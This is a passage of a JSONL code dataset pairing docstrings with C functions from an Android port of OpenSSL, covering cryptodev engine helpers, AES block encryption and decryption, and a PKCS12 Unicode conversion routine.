NULL;\n\t\tbreak;\n\t}\n\treturn (*cipher != NULL);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* USE_CRYPTODEV_DIGESTS */\n", "func_signal": "static int\ncryptodev_engine_digests(ENGINE *e, const EVP_MD **digest,\n    const int **nids, int nid)", "code": "{\n\tif (!digest)\n\t\treturn (cryptodev_usable_digests(nids));\n\n\tswitch (nid) {\n#ifdef USE_CRYPTODEV_DIGESTS\n\tcase NID_md5:\n\t\t*digest = &cryptodev_md5; \n\t\tbreak;\n\tcase NID_sha1:\n\t\t*digest = &cryptodev_sha1;\n \t\tbreak;\n\tdefault:\n#endif /* USE_CRYPTODEV_DIGESTS */\n\t\t*digest = NULL;\n\t\tbreak;\n\t}\n\treturn (*digest != NULL);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * ctrl right now is just a wrapper that doesn't do much\n * but I expect we'll want some options soon.\n */\n", "func_signal": "static int\ncryptodev_ctrl(ENGINE *e, int cmd, long i, void *p, void (*f)(void))", "code": "{\n#ifdef HAVE_SYSLOG_R\n\tstruct syslog_data sd = SYSLOG_DATA_INIT;\n#endif\n\n\tswitch (cmd) {\n\tdefault:\n#ifdef HAVE_SYSLOG_R\n\t\tsyslog_r(LOG_ERR, &sd,\n\t\t    \"cryptodev_ctrl: unknown command %d\", cmd);\n#else\n\t\tsyslog(LOG_ERR, \"cryptodev_ctrl: unknown command %d\", cmd);\n#endif\n\t\tbreak;\n\t}\n\treturn (1);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Encrypt a single block\n * in and out can overlap\n */\n", "func_signal": "void AES_encrypt(const unsigned char *in, unsigned char *out,\n\t\t const AES_KEY *key)", "code": "{\n\n\tconst u32 *rk;\n\tu32 s0, s1, s2, s3, t[4];\n\tint r;\n\n\tassert(in && out && key);\n\trk = key->rd_key;\n\n\t/*\n\t * map byte array block to cipher state\n\t * and add initial round key:\n\t */\n\ts0 = GETU32(in     ) ^ rk[0];\n\ts1 = GETU32(in +  4) ^ rk[1];\n\ts2 = GETU32(in +  8) ^ rk[2];\n\ts3 = GETU32(in + 12) ^ rk[3];\n\n#if defined(AES_COMPACT_IN_OUTER_ROUNDS)\n\tprefetch256(Te4);\n\n\tt[0] =\tTe4[(s0      ) & 0xff]       ^\n\t\tTe4[(s1 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s2 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s3 >> 24)       ] << 24;\n\tt[1] =\tTe4[(s1      ) & 0xff]       ^\n\t\tTe4[(s2 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s3 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s0 >> 24)       ] << 24;\n\tt[2] =\tTe4[(s2      ) & 0xff]       ^\n\t\tTe4[(s3 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s0 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s1 >> 24)       ] << 24;\n\tt[3] =\tTe4[(s3      ) & 0xff]       ^\n\t\tTe4[(s0 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s1 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s2 >> 24)       ] << 24;\n\n\t/* now do the linear transform using words */\n\t{\tint i;\n\t\tu32 r0, r1, r2;\n\n\t\tfor (i = 0; i < 4; i++) {\n\t\t\tr0 = t[i];\n\t\t\tr1 = r0 & 0x80808080;\n\t\t\tr2 = ((r0 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((r1 - (r1 >> 7)) & 0x1b1b1b1b);\n#if defined(ROTATE)\n\t\t\tt[i] = r2 ^ ROTATE(r2,24) ^ ROTATE(r0,24) ^\n\t\t\t\tROTATE(r0,16) ^ ROTATE(r0,8);\n#else\n\t\t\tt[i] = r2 ^ ((r2 ^ r0) << 24) ^ ((r2 ^ r0) >> 8) ^\n\t\t\t\t(r0 << 16) ^ (r0 >> 16) ^\n\t\t\t\t(r0 << 8) ^ (r0 >> 24);\n#endif\n\t\t\tt[i] ^= rk[4+i];\n\t\t}\n\t}\n#else\n\tt[0] =\tTe0[(s0      ) & 0xff] ^\n\t\tTe1[(s1 >>  8) & 0xff] ^\n\t\tTe2[(s2 >> 16) & 0xff] ^\n\t\tTe3[(s3 >> 24)       ] ^\n\t\trk[4];\n\tt[1] =\tTe0[(s1      ) & 0xff] ^\n\t\tTe1[(s2 >>  8) & 0xff] ^\n\t\tTe2[(s3 >> 16) & 0xff] ^\n\t\tTe3[(s0 >> 24)       ] ^\n\t\trk[5];\n\tt[2] =\tTe0[(s2      ) & 0xff] ^\n\t\tTe1[(s3 >>  8) & 0xff] ^\n\t\tTe2[(s0 >> 16) & 0xff] ^\n\t\tTe3[(s1 >> 24)       ] ^\n\t\trk[6];\n\tt[3] =\tTe0[(s3      ) & 0xff] ^\n\t\tTe1[(s0 >>  8) & 0xff] ^\n\t\tTe2[(s1 >> 16) & 0xff] ^\n\t\tTe3[(s2 >> 24)       ] ^\n\t\trk[7];\n#endif\n\ts0 = t[0]; s1 = t[1]; s2 = t[2]; s3 = t[3];\n\n    /*\n     * Nr - 2 full rounds:\n     */\n    for (rk+=8,r=key->rounds-2; r>0; rk+=4,r--) {\n#if defined(AES_COMPACT_IN_INNER_ROUNDS)\n\tt[0] =\tTe4[(s0      ) & 0xff]       ^\n\t\tTe4[(s1 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s2 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s3 >> 24)       ] << 24;\n\tt[1] =\tTe4[(s1      ) & 0xff]       ^\n\t\tTe4[(s2 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s3 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s0 >> 24)       ] << 24;\n\tt[2] =\tTe4[(s2      ) & 0xff]       ^\n\t\tTe4[(s3 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s0 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s1 >> 24)       ] << 24;\n\tt[3] =\tTe4[(s3      ) & 0xff]       ^\n\t\tTe4[(s0 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s1 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s2 >> 24)       ] << 24;\n\n\t/* now do the linear transform using words */\n\t{\tint i;\n\t\tu32 r0, r1, r2;\n\n\t\tfor (i = 0; i < 4; i++) {\n\t\t\tr0 = t[i];\n\t\t\tr1 = r0 & 0x80808080;\n\t\t\tr2 = ((r0 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((r1 - (r1 >> 7)) & 0x1b1b1b1b);\n#if defined(ROTATE)\n\t\t\tt[i] = r2 ^ ROTATE(r2,24) ^ ROTATE(r0,24) ^\n\t\t\t\tROTATE(r0,16) ^ ROTATE(r0,8);\n#else\n\t\t\tt[i] = r2 ^ ((r2 ^ r0) << 24) ^ ((r2 ^ r0) >> 8) ^\n\t\t\t\t(r0 << 16) ^ (r0 >> 16) ^\n\t\t\t\t(r0 << 8) ^ (r0 >> 24);\n#endif\n\t\t\tt[i] ^= rk[i];\n\t\t}\n\t}\n#else\n\tt[0] =\tTe0[(s0      ) & 0xff] ^\n\t\tTe1[(s1 >>  8) & 0xff] ^\n\t\tTe2[(s2 >> 16) & 0xff] ^\n\t\tTe3[(s3 >> 24)       ] ^\n\t\trk[0];\n\tt[1] =\tTe0[(s1      ) & 0xff] ^\n\t\tTe1[(s2 >>  8) & 0xff] ^\n\t\tTe2[(s3 >> 16) & 0xff] ^\n\t\tTe3[(s0 >> 24)       ] ^\n\t\trk[1];\n\tt[2] =\tTe0[(s2      ) & 0xff] ^\n\t\tTe1[(s3 >>  8) & 0xff] ^\n\t\tTe2[(s0 >> 16) & 0xff] ^\n\t\tTe3[(s1 >> 24)       ] ^\n\t\trk[2];\n\tt[3] =\tTe0[(s3      ) & 0xff] ^\n\t\tTe1[(s0 >>  8) & 0xff] ^\n\t\tTe2[(s1 >> 16) & 0xff] ^\n\t\tTe3[(s2 >> 24)       ] ^\n\t\trk[3];\n#endif\n\ts0 = t[0]; s1 = t[1]; s2 = t[2]; s3 = t[3];\n    }\n    /*\n\t * apply last round and\n\t * map cipher state to byte array block:\n\t */\n#if defined(AES_COMPACT_IN_OUTER_ROUNDS)\n\tprefetch256(Te4);\n\n\t*(u32*)(out+0) =\n\t\tTe4[(s0      ) & 0xff]       ^\n\t\tTe4[(s1 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s2 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s3 >> 24)       ] << 24 ^\n\t\trk[0];\n\t*(u32*)(out+4) =\n\t\tTe4[(s1      ) & 0xff]       ^\n\t\tTe4[(s2 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s3 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s0 >> 24)       ] << 24 ^\n\t\trk[1];\n\t*(u32*)(out+8) =\n\t\tTe4[(s2      ) & 0xff]       ^\n\t\tTe4[(s3 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s0 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s1 >> 24)       ] << 24 ^\n\t\trk[2];\n\t*(u32*)(out+12) =\n\t\tTe4[(s3      ) & 0xff]       ^\n\t\tTe4[(s0 >>  8) & 0xff] <<  8 ^\n\t\tTe4[(s1 >> 16) & 0xff] << 16 ^\n\t\tTe4[(s2 >> 24)       ] << 24 ^\n\t\trk[3];\n#else\n\t*(u32*)(out+0) =\n\t\t(Te2[(s0      ) & 0xff] & 0x000000ffU) ^\n\t\t(Te3[(s1 >>  8) & 0xff] & 0x0000ff00U) ^\n\t\t(Te0[(s2 >> 16) & 0xff] & 0x00ff0000U) ^\n\t\t(Te1[(s3 >> 24)       ] & 0xff000000U) ^\n\t\trk[0];\n\t*(u32*)(out+4) =\n\t\t(Te2[(s1      ) & 0xff] & 0x000000ffU) ^\n\t\t(Te3[(s2 >>  8) & 0xff] & 0x0000ff00U) ^\n\t\t(Te0[(s3 >> 16) & 0xff] & 0x00ff0000U) ^\n\t\t(Te1[(s0 >> 24)       ] & 0xff000000U) ^\n\t\trk[1];\n\t*(u32*)(out+8) =\n\t\t(Te2[(s2      ) & 0xff] & 0x000000ffU) ^\n\t\t(Te3[(s3 >>  8) & 0xff] & 0x0000ff00U) ^\n\t\t(Te0[(s0 >> 16) & 0xff] & 0x00ff0000U) ^\n\t\t(Te1[(s1 >> 24)       ] & 0xff000000U) ^\n\t\trk[2];\n\t*(u32*)(out+12) =\n\t\t(Te2[(s3      ) & 0xff] & 0x000000ffU) ^\n\t\t(Te3[(s0 >>  8) & 0xff] & 0x0000ff00U) ^\n\t\t(Te0[(s1 >> 16) & 0xff] & 0x00ff0000U) ^\n\t\t(Te1[(s2 >> 24)       ] & 0xff000000U) ^\n\t\trk[3];\n#endif\n}", "path": "crypto\\aes\\aes_x86core.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Decrypt a single block\n * in and out can overlap\n */\n", "func_signal": "void AES_decrypt(const unsigned char *in, unsigned char *out,\n\t\t const AES_KEY *key)", "code": "{\n\n\tconst u32 *rk;\n\tu32 s0, s1, s2, s3, t[4];\n\tint r;\n\n\tassert(in && out && key);\n\trk = key->rd_key;\n\n\t/*\n\t * map byte array block to cipher state\n\t * and add initial round key:\n\t */\n\ts0 = GETU32(in     ) ^ rk[0];\n\ts1 = GETU32(in +  4) ^ rk[1];\n\ts2 = GETU32(in +  8) ^ rk[2];\n\ts3 = GETU32(in + 12) ^ rk[3];\n\n#if defined(AES_COMPACT_IN_OUTER_ROUNDS)\n\tprefetch256(Td4);\n\n        t[0] =\tTd4[(s0      ) & 0xff]       ^\n\t\tTd4[(s3 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s2 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s1 >> 24)       ] << 24;\n        t[1] =\tTd4[(s1      ) & 0xff]       ^\n\t\tTd4[(s0 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s3 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s2 >> 24)       ] << 24;\n        t[2] =\tTd4[(s2      ) & 0xff]       ^\n\t\tTd4[(s1 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s0 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s3 >> 24)       ] << 24;\n        t[3] =\tTd4[(s3      ) & 0xff]       ^\n\t\tTd4[(s2 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s1 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s0 >> 24)       ] << 24;\n\n\t/* now do the linear transform using words */ \n\t{\tint i;\n\t\tu32 tp1, tp2, tp4, tp8, tp9, tpb, tpd, tpe, m;\n\n\t\tfor (i = 0; i < 4; i++) {\n\t\t\ttp1 = t[i];\n\t\t\tm = tp1 & 0x80808080;\n\t\t\ttp2 = ((tp1 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp2 & 0x80808080;\n\t\t\ttp4 = ((tp2 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp4 & 0x80808080;\n\t\t\ttp8 = ((tp4 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\ttp9 = tp8 ^ tp1;\n\t\t\ttpb = tp9 ^ tp2;\n\t\t\ttpd = tp9 ^ tp4;\n\t\t\ttpe = tp8 ^ tp4 ^ tp2;\n#if defined(ROTATE)\n\t\t\tt[i] = tpe ^ ROTATE(tpd,16) ^\n\t\t\t\tROTATE(tp9,8) ^ ROTATE(tpb,24);\n#else\n\t\t\tt[i] = tpe ^ (tpd >> 16) ^ (tpd << 16) ^ \n\t\t\t\t(tp9 >> 24) ^ (tp9 << 8) ^\n\t\t\t\t(tpb >> 8) ^ (tpb << 24);\n#endif\n\t\t\tt[i] ^= rk[4+i];\n\t\t}\n\t}\n#else\n\tt[0] =\tTd0[(s0      ) & 0xff] ^\n\t\tTd1[(s3 >>  8) & 0xff] ^\n\t\tTd2[(s2 >> 16) & 0xff] ^\n\t\tTd3[(s1 >> 24)       ] ^\n\t\trk[4];\n\tt[1] =\tTd0[(s1      ) & 0xff] ^\n\t\tTd1[(s0 >>  8) & 0xff] ^\n\t\tTd2[(s3 >> 16) & 0xff] ^\n\t\tTd3[(s2 >> 24)       ] ^\n\t\trk[5];\n\tt[2] =\tTd0[(s2      ) & 0xff] ^\n\t\tTd1[(s1 >>  8) & 0xff] ^\n\t\tTd2[(s0 >> 16) & 0xff] ^\n\t\tTd3[(s3 >> 24)       ] ^\n\t\trk[6];\n\tt[3] =\tTd0[(s3      ) & 0xff] ^\n\t\tTd1[(s2 >>  8) & 0xff] ^\n\t\tTd2[(s1 >> 16) & 0xff] ^\n\t\tTd3[(s0 >> 24)       ] ^\n\t\trk[7];\n#endif\n\ts0 = t[0]; s1 = t[1]; s2 = t[2]; s3 = t[3];\n\n    /*\n     * Nr - 2 full rounds:\n     */\n    for (rk+=8,r=key->rounds-2; r>0; rk+=4,r--) {\n#if defined(AES_COMPACT_IN_INNER_ROUNDS)\n        t[0] =\tTd4[(s0      ) & 0xff]       ^\n\t\tTd4[(s3 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s2 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s1 >> 24)       ] << 24;\n        t[1] =\tTd4[(s1      ) & 0xff]       ^\n\t\tTd4[(s0 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s3 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s2 >> 24)       ] << 24;\n        t[2] =\tTd4[(s2      ) & 0xff]       ^\n\t\tTd4[(s1 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s0 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s3 >> 24)       ] << 24;\n        t[3] =\tTd4[(s3      ) & 0xff]       ^\n\t\tTd4[(s2 >>  8) & 0xff] <<  8 ^\n\t\tTd4[(s1 >> 16) & 0xff] << 16 ^\n\t\tTd4[(s0 >> 24)       ] << 24;\n\n\t/* now do the linear transform using words */ \n\t{\tint i;\n\t\tu32 tp1, tp2, tp4, tp8, tp9, tpb, tpd, tpe, m;\n\n\t\tfor (i = 0; i < 4; i++) {\n\t\t\ttp1 = t[i];\n\t\t\tm = tp1 & 0x80808080;\n\t\t\ttp2 = ((tp1 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp2 & 0x80808080;\n\t\t\ttp4 = ((tp2 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp4 & 0x80808080;\n\t\t\ttp8 = ((tp4 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\ttp9 = tp8 ^ tp1;\n\t\t\ttpb = tp9 ^ tp2;\n\t\t\ttpd = tp9 ^ tp4;\n\t\t\ttpe = tp8 ^ tp4 ^ tp2;\n#if defined(ROTATE)\n\t\t\tt[i] = tpe ^ ROTATE(tpd,16) ^\n\t\t\t\tROTATE(tp9,8) ^ ROTATE(tpb,24);\n#else\n\t\t\tt[i] = tpe ^ (tpd >> 16) ^ (tpd << 16) ^ \n\t\t\t\t(tp9 >> 24) ^ (tp9 << 8) ^\n\t\t\t\t(tpb >> 8) ^ (tpb << 24);\n#endif\n\t\t\tt[i] ^= rk[i];\n\t\t}\n\t}\n#else\n\tt[0] =\tTd0[(s0      ) & 0xff] ^\n\t\tTd1[(s3 >>  8) & 0xff] ^\n\t\tTd2[(s2 >> 16) & 0xff] ^\n\t\tTd3[(s1 >> 24)       ] ^\n\t\trk[0];\n\tt[1] =\tTd0[(s1      ) & 0xff] ^\n\t\tTd1[(s0 >>  8) & 0xff] ^\n\t\tTd2[(s3 >> 16) & 0xff] ^\n\t\tTd3[(s2 >> 24)       ] ^\n\t\trk[1];\n\tt[2] =\tTd0[(s2      ) & 0xff] ^\n\t\tTd1[(s1 >>  8) & 0xff] ^\n\t\tTd2[(s0 >> 16) & 0xff] ^\n\t\tTd3[(s3 >> 24)       ] ^\n\t\trk[2];\n\tt[3] =\tTd0[(s3      ) & 0xff] ^\n\t\tTd1[(s2 >>  8) & 0xff] ^\n\t\tTd2[(s1 >> 16) & 0xff] ^\n\t\tTd3[(s0 >> 24)       ] ^\n\t\trk[3];\n#endif\n\ts0 = t[0]; s1 = t[1]; s2 = t[2]; s3 = t[3];\n    }\n    /*\n\t * apply last round and\n\t * map cipher state to byte array block:\n\t */\n\tprefetch256(Td4);\n\n\t*(u32*)(out+0) =\n\t\t(Td4[(s0      ) & 0xff])\t^\n\t\t(Td4[(s3 >>  8) & 0xff] <<  8) ^\n\t\t(Td4[(s2 >> 16) & 0xff] << 16) ^\n\t\t(Td4[(s1 >> 24)       ] << 24) ^\n\t\trk[0];\n\t*(u32*)(out+4) =\n\t\t(Td4[(s1      ) & 0xff])\t ^\n\t\t(Td4[(s0 >>  8) & 0xff] <<  8) ^\n\t\t(Td4[(s3 >> 16) & 0xff] << 16) ^\n\t\t(Td4[(s2 >> 24)       ] << 24) ^\n\t\trk[1];\n\t*(u32*)(out+8) =\n\t\t(Td4[(s2      ) & 0xff])\t ^\n\t\t(Td4[(s1 >>  8) & 0xff] <<  8) ^\n\t\t(Td4[(s0 >> 16) & 0xff] << 16) ^\n\t\t(Td4[(s3 >> 24)       ] << 24) ^\n\t\trk[2];\n\t*(u32*)(out+12) =\n\t\t(Td4[(s3      ) & 0xff])\t ^\n\t\t(Td4[(s2 >>  8) & 0xff] <<  8) ^\n\t\t(Td4[(s1 >> 16) & 0xff] << 16) ^\n\t\t(Td4[(s0 >> 24)       ] << 24) ^\n\t\trk[3];\n}", "path": "crypto\\aes\\aes_x86core.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Find out what digests /dev/crypto will let us have a session for.\n * XXX note, that some of these openssl doesn't deal with yet!\n * returning them here is harmless, as long as we return NULL\n * when asked for a handler in the cryptodev_engine_digests routine\n */\n", "func_signal": "static int\nget_cryptodev_digests(const int **cnids)", "code": "{\n\tstatic int nids[CRYPTO_ALGORITHM_MAX];\n\tstruct session_op sess;\n\tint fd, i, count = 0;\n\n\tif ((fd = get_dev_crypto()) < 0) {\n\t\t*cnids = NULL;\n\t\treturn (0);\n\t}\n\tmemset(&sess, 0, sizeof(sess));\n\tsess.mackey = (caddr_t)\"123456789abcdefghijklmno\";\n\tfor (i = 0; digests[i].id && count < CRYPTO_ALGORITHM_MAX; i++) {\n\t\tif (digests[i].nid == NID_undef)\n\t\t\tcontinue;\n\t\tsess.mac = digests[i].id;\n\t\tsess.mackeylen = digests[i].keylen;\n\t\tsess.cipher = 0;\n\t\tif (ioctl(fd, CIOCGSESSION, &sess) != -1 &&\n\t\t    ioctl(fd, CIOCFSESSION, &sess.ses) != -1)\n\t\t\tnids[count++] = digests[i].nid;\n\t}\n\tclose(fd);\n\n\tif (count > 0)\n\t\t*cnids = nids;\n\telse\n\t\t*cnids = NULL;\n\treturn (count);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/**\n * Expand the cipher key into the decryption key schedule.\n */\n", "func_signal": "int AES_set_decrypt_key(const unsigned char *userKey, const int bits,\n\t\t\t AES_KEY *key)", "code": "{\n\n        u32 *rk;\n\tint i, j, status;\n\tu32 temp;\n\n\t/* first, start with an encryption schedule */\n\tstatus = AES_set_encrypt_key(userKey, bits, key);\n\tif (status < 0)\n\t\treturn status;\n\n\trk = key->rd_key;\n\n\t/* invert the order of the round keys: */\n\tfor (i = 0, j = 4*(key->rounds); i < j; i += 4, j -= 4) {\n\t\ttemp = rk[i    ]; rk[i    ] = rk[j    ]; rk[j    ] = temp;\n\t\ttemp = rk[i + 1]; rk[i + 1] = rk[j + 1]; rk[j + 1] = temp;\n\t\ttemp = rk[i + 2]; rk[i + 2] = rk[j + 2]; rk[j + 2] = temp;\n\t\ttemp = rk[i + 3]; rk[i + 3] = rk[j + 3]; rk[j + 3] = temp;\n\t}\n\t/* apply the inverse MixColumn transform to all round keys but the first and the last: */\n\tfor (i = 1; i < (key->rounds); i++) {\n\t\trk += 4;\n#if 1\n\t\tfor (j = 0; j < 4; j++) {\n\t\t\tu32 tp1, tp2, tp4, tp8, tp9, tpb, tpd, tpe, m;\n\n\t\t\ttp1 = rk[j];\n\t\t\tm = tp1 & 0x80808080;\n\t\t\ttp2 = ((tp1 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp2 & 0x80808080;\n\t\t\ttp4 = ((tp2 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\tm = tp4 & 0x80808080;\n\t\t\ttp8 = ((tp4 & 0x7f7f7f7f) << 1) ^\n\t\t\t\t((m - (m >> 7)) & 0x1b1b1b1b);\n\t\t\ttp9 = tp8 ^ tp1;\n\t\t\ttpb = tp9 ^ tp2;\n\t\t\ttpd = tp9 ^ tp4;\n\t\t\ttpe = tp8 ^ tp4 ^ tp2;\n#if defined(ROTATE)\n\t\t\trk[j] = tpe ^ ROTATE(tpd,16) ^\n\t\t\t\tROTATE(tp9,8) ^ ROTATE(tpb,24);\n#else\n\t\t\trk[j] = tpe ^ (tpd >> 16) ^ (tpd << 16) ^ \n\t\t\t\t(tp9 >> 24) ^ (tp9 << 8) ^\n\t\t\t\t(tpb >> 8) ^ (tpb << 24);\n#endif\n\t\t}\n#else\n\t\trk[0] =\n\t\t\tTd0[Te2[(rk[0]      ) & 0xff] & 0xff] ^\n\t\t\tTd1[Te2[(rk[0] >>  8) & 0xff] & 0xff] ^\n\t\t\tTd2[Te2[(rk[0] >> 16) & 0xff] & 0xff] ^\n\t\t\tTd3[Te2[(rk[0] >> 24)       ] & 0xff];\n\t\trk[1] =\n\t\t\tTd0[Te2[(rk[1]      ) & 0xff] & 0xff] ^\n\t\t\tTd1[Te2[(rk[1] >>  8) & 0xff] & 0xff] ^\n\t\t\tTd2[Te2[(rk[1] >> 16) & 0xff] & 0xff] ^\n\t\t\tTd3[Te2[(rk[1] >> 24)       ] & 0xff];\n\t\trk[2] =\n\t\t\tTd0[Te2[(rk[2]      ) & 0xff] & 0xff] ^\n\t\t\tTd1[Te2[(rk[2] >>  8) & 0xff] & 0xff] ^\n\t\t\tTd2[Te2[(rk[2] >> 16) & 0xff] & 0xff] ^\n\t\t\tTd3[Te2[(rk[2] >> 24)       ] & 0xff];\n\t\trk[3] =\n\t\t\tTd0[Te2[(rk[3]      ) & 0xff] & 0xff] ^\n\t\t\tTd1[Te2[(rk[3] >>  8) & 0xff] & 0xff] ^\n\t\t\tTd2[Te2[(rk[3] >> 16) & 0xff] & 0xff] ^\n\t\t\tTd3[Te2[(rk[3] >> 24)       ] & 0xff];\n#endif\n\t}\n\treturn 0;\n}", "path": "crypto\\aes\\aes_x86core.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Caching version for asym operations */\n", "func_signal": "static int\nget_asym_dev_crypto(void)", "code": "{\n\tstatic int fd = -1;\n\n\tif (fd == -1)\n\t\tfd = get_dev_crypto();\n\treturn fd;\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Convert a BIGNUM to the representation that /dev/crypto needs.\n * Upon completion of use, the caller is responsible for freeing\n * crp->crp_p.\n */\n", "func_signal": "static int\nbn2crparam(const BIGNUM *a, struct crparam *crp)", "code": "{\n\tint i, j, k;\n\tssize_t bytes, bits;\n\tu_char *b;\n\n\tcrp->crp_p = NULL;\n\tcrp->crp_nbits = 0;\n\n\tbits = BN_num_bits(a);\n\tbytes = (bits + 7) / 8;\n\n\tb = malloc(bytes);\n\tif (b == NULL)\n\t\treturn (1);\n\tmemset(b, 0, bytes);\n\n\tcrp->crp_p = (caddr_t) b;\n\tcrp->crp_nbits = bits;\n\n\tfor (i = 0, j = 0; i < a->top; i++) {\n\t\tfor (k = 0; k < BN_BITS2 / 8; k++) {\n\t\t\tif ((j + k) >= bytes)\n\t\t\t\treturn (0);\n\t\t\tb[j + k] = a->d[i] >> (k * 8);\n\t\t}\n\t\tj += BN_BITS2 / 8;\n\t}\n\treturn (0);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/* Cheap and nasty Unicode stuff */\n", "func_signal": "unsigned char *OPENSSL_asc2uni(const char *asc, int asclen, unsigned char **uni, int *unilen)", "code": "{\n\tint ulen, i;\n\tunsigned char *unitmp;\n\tif (asclen == -1) asclen = strlen(asc);\n\tulen = asclen*2  + 2;\n\tif (!(unitmp = OPENSSL_malloc(ulen))) return NULL;\n\tfor (i = 0; i < ulen - 2; i+=2) {\n\t\tunitmp[i] = 0;\n\t\tunitmp[i + 1] = asc[i>>1];\n\t}\n\t/* Make result double null terminated */\n\tunitmp[ulen - 2] = 0;\n\tunitmp[ulen - 1] = 0;\n\tif (unilen) *unilen = ulen;\n\tif (uni) *uni = unitmp;\n\treturn unitmp;\n}", "path": "crypto\\pkcs12\\p12_utl.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
{"docstring": "/*\n * Find out what ciphers /dev/crypto will let us have a session for.\n * XXX note, that some of these openssl doesn't deal with yet!\n * returning them here is harmless, as long as we return NULL\n * when asked for a handler in the cryptodev_engine_ciphers routine\n */\n", "func_signal": "static int\nget_cryptodev_ciphers(const int **cnids)", "code": "{\n\tstatic int nids[CRYPTO_ALGORITHM_MAX];\n\tstruct session_op sess;\n\tint fd, i, count = 0;\n\n\tif ((fd = get_dev_crypto()) < 0) {\n\t\t*cnids = NULL;\n\t\treturn (0);\n\t}\n\tmemset(&sess, 0, sizeof(sess));\n\tsess.key = (caddr_t)\"123456789abcdefghijklmno\";\n\n\tfor (i = 0; ciphers[i].id && count < CRYPTO_ALGORITHM_MAX; i++) {\n\t\tif (ciphers[i].nid == NID_undef)\n\t\t\tcontinue;\n\t\tsess.cipher = ciphers[i].id;\n\t\tsess.keylen = ciphers[i].keylen;\n\t\tsess.mac = 0;\n\t\tif (ioctl(fd, CIOCGSESSION, &sess) != -1 &&\n\t\t    ioctl(fd, CIOCFSESSION, &sess.ses) != -1)\n\t\t\tnids[count++] = ciphers[i].nid;\n\t}\n\tclose(fd);\n\n\tif (count > 0)\n\t\t*cnids = nids;\n\telse\n\t\t*cnids = NULL;\n\treturn (count);\n}", "path": "crypto\\engine\\eng_cryptodev.c", "repo_name": "eighthave/openssl-android", "stars": 78, "license": "other", "language": "c", "size": 6493}
